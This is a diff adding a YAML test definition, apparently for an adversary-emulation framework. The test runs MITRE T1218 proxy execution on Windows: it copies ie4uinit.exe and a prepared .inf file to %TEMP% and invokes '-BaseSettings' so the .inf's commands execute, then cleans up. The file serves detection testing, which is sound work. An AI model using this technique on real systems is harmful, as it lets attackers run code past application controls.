@@ -1,0 +1,34 @@
+api_version: "2.0"
+name: Lolbas ie4uinit.exe use as proxy
+description: |
+    Executes commands from a specially prepared ie4uinit.inf file.
+    Poc from : https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/
+    Reference: https://lolbas-project.github.io/lolbas/Binaries/Ie4uinit/
+args:
+    - name: Path_inf
+      type: path
+      default: PathToAtomicsFolder\T1218\src\ieuinit.inf
+    - name: Path_ie4uinit
+      type: path
+      default: c:\windows\system32\ie4uinit.exe
+uuid: 13c0804e-615e-43ad-b223-2dfbacd0b0b3
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1218: System Binary Proxy Execution'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: lolbas-ie4uinit.exe-use-as-proxy
+      inline: |
+        copy {{.Args.Path_ie4uinit}} %TEMP%\ie4uinit.exe
+        copy "{{.Args.Path_inf}}" %TEMP%\ieuinit.inf
+        %TEMP%\ie4uinit.exe -BaseSettings
+      executor: command_prompt
+      cleanup:
+        inline: |
+            del %TEMP%\ie4uinit.exe >nul 2>&1
+            del %TEMP%\ieuinit.inf >nul 2>&1
+        executor: command_prompt
